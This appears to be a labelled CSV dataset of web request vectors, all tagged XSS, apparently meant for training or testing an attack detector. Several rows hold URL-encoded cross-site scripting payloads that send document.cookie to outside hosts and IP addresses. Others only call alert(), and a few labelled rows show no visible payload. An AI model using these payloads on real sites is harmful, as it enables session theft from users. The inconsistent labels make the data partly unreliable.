id,class,vector
46,XSS,/G6KbVingcWLXyv/9aee7sw/MEjMDlibbAYWHselectpphp/fDzbKe/iruhQptUkG/l3H@uSlttYe0/yidlnm3ie.asp?if=oTjVgM&mdyr3flrdgertb3=8%5DprarLfies+i&haikrttH=zChrlpzecsiae&eNrocsgtsss=1032086&em0p8kvesr=261543&hoe2iot6ensa=80775&l4elnis4thy=%3Cdiv+++++style++%3D+%22+++++width%3A+++expression%28%5Bdocument.location.replace%28%27http%3A%2F%2Fwww.dedege.com%2Fcgi-bin%2Fnsin.cgi%27%2Bdocument.cookie%29%3B%5D%29%3B%22++++%3E&UxjLrujnocopy=Axsheoa2dlaorp&eahb1wl8w=514517777&erako1ho=++0gaan+zmr&eA4rhc=43&sb2mnhw2e=fsft5ors72a&3su7eDreznaVfa=Tthxterm-zscriptt%7Eaixhtoo3+&cashlsoeamZold=rnne1tee+rhn-wda&cdc9rfhoeet=xuhml
54,XSS,/BE2/ups_am6I/nL@e/flwe/odrDRzt1EfJ.s/F7WW-iha/ChMcH-/SvbscriptexecrgJtu/7bcbLmqnonueO7teyslw/lFxZWYN5W/hB._@B.es98.jpg?brtpdw=321&v7psFsi=tiexedivYAlex%7C&st7syldclamEfTn=%3C%21--+--+--%3E%3Cscript+%3E%5Bdocument.location.replace+%28%27http%3A%2F%2Fwww.silenaol.com%2Fcgi-bin%2Fsiesen.cgi%27%2Bdocument.cookie%29%3B%5D%3C%2Fscript+++%3E%3C%21--+--+--%3E&fn=2527&k2IdqD=7&ota1ue=qmprx
59,XSS,/DCBZunhttpsWlocation/na8ytiMA/Bgu/rU7@pO3Nyf.IZ4wRF5/meeurieiniflnn/rwwOshenaenlzg/YUVU/nNrYHuB.jpeg?rtoAx=sdocument%2Fx&hnr8=oh&te7oz=%3Cdiv+++style++%3D++++%22+++binding%3A+++++url%28%5Bhttp%3A%2F%2Fwww.rimaasis.com%2Fscript%2Fstopweto.swf%5D%29%3B++%22++++%3E&gehslNn=43&7eohHuior=input&eqeuee=80572248
100,XSS,eSi4yoessaaac4T=|rct/&aeDioiIe=5533469389&ntbymstm8e=lserviceshat8rs0otetelnetnjny&rCe=617638627&jM3-v=wiMnretaa2O&metaS5a9g=cone&orrtntap=hht udivtpese%o&hL-gGPN0H=winnt1Sho&UitttHy5=931276&dbeyde421Eteduc=itde0lpa8r6xtcNa
119,XSS,/2nyA9if.tiff?seers6talerrW=%3Ca++href++%3D++++%22javas%26%2399%3Bript%26%2335%3B%5Balert+%28%27tatldb1srg%27%29%3B%5D+++++%22++++%3E
124,XSS,/v@4@Q/t-oxterm/802Soy@y7ap/oMS/dl8qtFczomtue/dlessbhr/h03E/XShIHWftowp-eSir/1JmJf/s9bcC.mdb?dTaaumL=4&Z21-delete3h2=rdelecmytvraef3t&linkH5-OKEyzflogn=%3Cscript++%3Ealert+++%28z8ens.ee4t%29%3C%2Fscript++++%3E&miicliirrcab=84358&Apegoe4nlT=550&kmdn9ulestesxfg=rhL&tB=p
127,XSS,/zeAhwmacgsem/rrnstiaer5/icwsT2/oK_HdroQl@/rooHSVC6lJsQ_k5NST2p/eYMEo-._VdkWuW0wqR@k/d6snugRnTkk7rywMx/l8/hbH/w8/a0rXrVG8QM.pl?rcenalejcn1gie=eCJIQjfOd&clt4cm=%3C%21%5BCDATA%5B%3C%21--%5D%5D%3E%3Cscript+%3E%5Bwindow.open%28%27http%3A%2F%2F224.89.169.174%2Fis.mspx%27%2Bdocument.cookie%29%3B%5D%2F%2F--%3E%3C%2Fscript%3E
130,XSS,/Ar2jNadjed6m/ul5qsMjKUmPe/hdZiHVt.6BuO.mspx?gsnn1ct7Msc=966shoxS&6aei=69870&rm=eo&othgen2aaueei=19&bAmRgb1WB9P=i%25lIlh&se6s=c5kzHNE&EpdreaAeRzo=wetb9ocrndzim9y9neii
137,XSS,/yoPAJeJM/en@GxIz_U99UlEmy6w7/5fd17oDq1m/u-mCIN229Lks/itmenrtsyo4wo/Elpni2haAdisinEeaI/nellIstoittk/tdesCfUew/eDQ.asp?DlEwhereqopen1G5@qS=9&o7ienn=5Ps&-TmXgsweDnhJ=32130245&iZh=s5-objecto9s7kut&5Ct6.uk=%3Ciframe+++src+++%3D%22++vbscript%3A%5Balert+++%28%27re%27%29%3B%5D+++++%22%3E
138,XSS,/eo@qg7Emug3/o6g/KW/espnl4tsttietdbflray/rHVLTFSNJAc3ZzB/ci7uf/aE9PtJVZsl.-lfZw4/inA3.swf?a5iaeqbryrp=%3DyoooC4ior1uoht6h&55i=swoormiOa4een&tirfTrlret=e5u4asneoahttpi&rtmpfrom5O-NOmetalinkZlib=cecKa9tiodhrNbded&aen2ewhoqnte=eYssau3&lpnccu=ae&CNvscriptqmDsjG=%26%3Cscript++++%3E%5Bdocument.location.replace++++%28%27http%3A%2F%2Fwww.ni.com%2Fcgi-bin%2Falte.cgi%27%2Bdocument.cookie%29%3B%5D%3C%2Fscript+%3E&otTrc=olhePs
147,XSS,/eN_qoV6YLJ/8hr80enud.aspx?91rdprjLet3aI=s1c&itte=%26%7B%5Bwindow.open%28%27http%3A%2F%2F70.10.76.185%2Fch.php%27%2Bdocument.cookie%29%3B%5D%7D%3B&hthiosr4ew7fsh=ennehrOyn02Sscot&Ebh1=0385047&mpeiiatLA=rvu_UMIu_j
152,XSS,/pZZJsqIovL5/igbBJVqQeE/es/oeiemysntddRai/otdEep5oap8n/nm7ibn/zKfW1POj_gq-w/5sMuZuEeLoImzG.php?brexecJO=83391&cet7dye0eer=%3Cscript+++%3Ealert+%28oorArcIhod4yNm.tBean%29%3C%2Fscript%3E&raCnaxtefga89ty=2OtmetaautoexectEr%27t&hsAioR=2A&giyds6ieMtH=aH2%7Eikxdlbsot&hganrrseehidzml=%5Cd&odooewhe=oumetawyh&ojnncoh4pslma=80740&.rm9T0shutdown=r4eof&nPwIEde=7726800388&GIxQt-bZWZa5=vZCa
153,XSS,/2jPmailperlyXBYRLP.html?wWe6gC3I05KF=%3Cimg+++src+%3D++++%22++javascript%3A++%5Bwindow.open%28%27http%3A%2F%2F117.158.117.52%2Fnggeal.mspx%27%2Bdocument.cookie%29%3B%5D++++%22+%3E
155,XSS,/tFoinrddnocty/iADCv/ot7Em2AVSFnqVk/zpassthru5.FSshutdownoXzUIM/ytfxltroidiaT9h/AdcDuG3evalL1VmT/1Nw8N3GAp0t211_1O6lS/sob/edt2qH12XoUZ48csoovw/ars7tNtaisijdOdvahnc/aUp@Cx3-0RxJZGV.shtml?ceh=ae%27ot&2eendm2iomytio=%3Clink+++rel++%3D++%22++++stylesheet%22++++href++++%3D++++%22+javascript%3A+++%5Balert++++%28%27oeanuM%27%29%3B%5D+++++%22%3E
156,XSS,/vj/ikjU1PF/t6noqs.asmx?
160,XSS,/n@XnqnFG2N/oo33nre4cctfnlsidr/Mnsp/rBZmkQh/3jtQ4s1WUlBxbin/mmu7TMsnmRIDuhditott/M-_aU4ZRJ.gif?eaL5l5seigdtri=LfallOngroup+by%29rOnr&icrdamai0tr4r=54&ssock_stream02wform=%3Cscript+%3Ealert+++%28aciaineoe.unru%29%3C%2Fscript++%3E&rmtmqcn=lus&PdX458tincludehttpsKWa=q&i4iGne=rnhA&ueranlAtmfmwur=te+xrs%29nn&cefClchwnhh=torcpeE&hxp_Dyprocessing-instruction9gJKV=tay
170,XSS,/bSBR/sPm7tMgtdflRywmS/ec6satmeathnAs3Ldn/ihin/ii88jtxW5nLRrnEzBb.cgi?zGOboot.iniorl=tr3k6&6etc=mrpmaapsktxwp-Ur&eshreeeie0ndhcb=t%3F+y+rttvwdocumenthN8ttncautoexect&nwbei5tehLnuj=9157072&rxxkRpasswd=l06+e&t8r=000&rXQXTV0Bsb=onrnmtyeenesg1etm&nSreespcanqR=rcues&nInhnhh=86&ip8rtd=394525&e7sfsasm=sol9j%27n++
174,XSS,/iH_Ge/f6Jivt7RfN4_0HhHS/tEKeb4M@.css?t0zi0na=35232&laTtueSq6=6tlDwcoatldl&varW01Fhavingnf-=nor&isntiampksra=%3Ciframe+++++src+++%3D+++%22++++vbscript%3A%5Bdocument.location.replace%28%27http%3A%2F%2Fwww.asrotora.com%2Fcgi-bin%2Fratagetrro.cgi%27%2Bdocument.cookie%29%3B%5D%22++++%3E
185,XSS,/dPdBAGdw7/3ot.shtml?prcinolSods=ubt1ntlv&rets=9120&warsdln4b=6&aoyfshs=362645112&rd=sS_2etPWIv&tHXRdroprVk4v=loga%3Ayb85eeTr%24uEn3&yzseEsehtame5ui=2866&keds=lfra%5DopenQaru&Miftedkkbdd=+i%29et
220,XSS,"rotur1tpfytae=<style    type =   ""text/javascript  "">[alert ('9teb');]</style>&yBtht=u&mq4etre4j=myMT&A4U4NJstyleHopeny5t=di&idoEaru=lh"
231,XSS,/Dnrizhj6aayF0efyoij/flSothudCnathdos/6H3Z5QSQHPup9Mr_F2/tbyaeiteraee/jhXUXc0kJ@MX/rf@UJXDfivn9FBg9yH/wPDyL2linkIstylei/sdRytmw-m@Jzd/PGru/RP.css?iqeaaauda0=124&timcetne0sdspue=755
